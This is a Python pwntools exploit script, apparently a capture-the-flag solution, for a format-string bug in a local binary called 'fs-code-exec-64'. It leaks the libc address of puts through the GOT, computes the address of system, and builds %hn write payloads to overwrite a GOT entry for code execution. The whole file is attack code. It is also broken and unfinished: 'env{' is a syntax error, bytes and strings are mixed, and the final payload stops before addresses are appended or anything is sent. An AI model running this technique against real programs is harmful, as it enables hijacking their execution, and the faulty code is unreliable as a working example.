from pwn import *

env{
    'PATH' : '.:/bin:/usr/bin'
}

e = ELF('./fs-code-exec-64')
p = process(e.path, env=env)
#we wanna get the runtime address
puts_got = p.elf.got['puts']
printf_got = p.elf.got['printf']


print(hex(puts_got))
print(hex(printf_got))

##################################
# part 1
##################################

payload = b'%7$sBBBB' + p64(puts_got)

p.sendline(payload)

data = p.recv()
d = data.split(b' ')[1][:6] + b'\x00\x00'

libc_puts = u64(d)
libc_system = libc_puts - e.libc.symbols['puts'] + e.libc.symbols['system']

#dividing libc_system address into three segments of two bytes (3rd, 2nd, 1st)

first = libc_system & 0xffff
second = ((libc_system >> 16) & 0xffff) - first

while second < 0:
    second += 0x10000

third = ((libc_system >> 32) & 0xffff) - second - first
while third < 0:
    third += 0x10000

######################################
# part 2
######################################

payload = "%{}x".format(first) #print 'first' amount.
payload += "%11$hn" #write two bytes to 11th arg. addr.
payload += "%{}x".format(second) #print 'second' amount.
payload += "%12$hn" #write two bytes to 12th arg. addr.
payload += "%{}x".format(third) #print 'third' amount.
payload += "%13$hn" #write two bytes to 13th arg. addr.
payload += "A"